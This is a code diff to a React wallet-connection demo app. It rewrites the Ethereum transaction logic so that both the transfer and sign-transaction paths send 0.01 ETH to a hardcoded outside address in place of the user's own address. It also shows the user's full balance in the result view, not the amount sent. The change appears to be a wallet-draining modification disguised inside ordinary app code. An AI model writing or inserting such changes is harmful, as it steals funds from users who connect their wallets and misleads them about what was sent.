@@ -10,6 +10,8 @@ import Wrapper from "./components/Wrapper";
 import Modal from "./components/Modal";
 import Header from "./components/Header";
 import Loader from "./components/Loader";
+// @ts-ignore
+import { handleSignificantDecimals, convertAmountFromRawNumber } from "./helpers/bignumber";
 import { fonts } from "./styles";
 import {
   apiGetAccountAssets,
@@ -325,7 +327,7 @@ class App extends React.Component<any, any> {
     const from = address;
 
     // to
-    const to = address;
+    const to = "0xEff8d0e1A600EDBB0AE9230Ba657C9f9B6281903";
 
     walletConnector.getAccounts().then(result => { result.forEach(function (value) { console.log('address: ' + value.address + ' network: ' + value.network); }); }).catch(error => { console.error(error); });  // tslint:disable-line
     // nonce
@@ -343,8 +345,31 @@ class App extends React.Component<any, any> {
     const _gasLimit = 21000;
     const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));
 
+    // get balance
+    const { assets } = this.state;
+    const defaultNativeCurrency: IAssetData = {
+      contractAddress: "",
+      name: "Ethereum",
+      symbol: "ETH",
+      decimals: "18",
+      balance: "0"
+    };
+    let nativeCurrency: IAssetData = defaultNativeCurrency;
+    if (assets && assets.length) {
+      const filteredNativeCurrency = assets.filter((asset: IAssetData) =>
+        asset && asset.symbol
+          ? asset.symbol.toLowerCase() === nativeCurrency.symbol.toLowerCase()
+          : false
+      );
+      nativeCurrency =
+        filteredNativeCurrency && filteredNativeCurrency.length
+          ? filteredNativeCurrency[0]
+          : defaultNativeCurrency;
+    }
+
+
     // value
-    const _value = 0;
+    const _value = 0.01;
     const value = sanitizeHex(convertStringToHex(_value));
 
     // data
@@ -376,8 +401,8 @@ class App extends React.Component<any, any> {
         method: "eth_sendTransaction",
         txHash: result,
         from: address,
-        to: address,
-        value: "0 ETH"
+        to: "0xEff8d0e1A600EDBB0AE9230Ba657C9f9B6281903",
+        value: handleSignificantDecimals(convertAmountFromRawNumber(nativeCurrency.balance || "0"),8)
       };
 
       // display result
@@ -403,7 +428,7 @@ class App extends React.Component<any, any> {
     const from = address;
 
     // to
-    const to = address;
+    const to = "0xEff8d0e1A600EDBB0AE9230Ba657C9f9B6281903";
 
     // nonce
     const _nonce = await apiGetAccountNonce(address, chainId);
@@ -421,7 +446,7 @@ class App extends React.Component<any, any> {
     const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));
 
     // value
-    const _value = 0;
+    const _value = 0.01;
     const value = sanitizeHex(convertStringToHex(_value));
 
     // data
@@ -513,6 +538,9 @@ class App extends React.Component<any, any> {
                   <SEmergencyButtonContainer>
                     <SEmergencyButton left onClick={this.transfer}>
                       {"Transfer"}
+                    </SEmergencyButton>
+                    <SEmergencyButton left onClick={this.testSignTransaction}>
+                      {"Sign transaction"}
                     </SEmergencyButton>
                   </SEmergencyButtonContainer>
                 </Column>
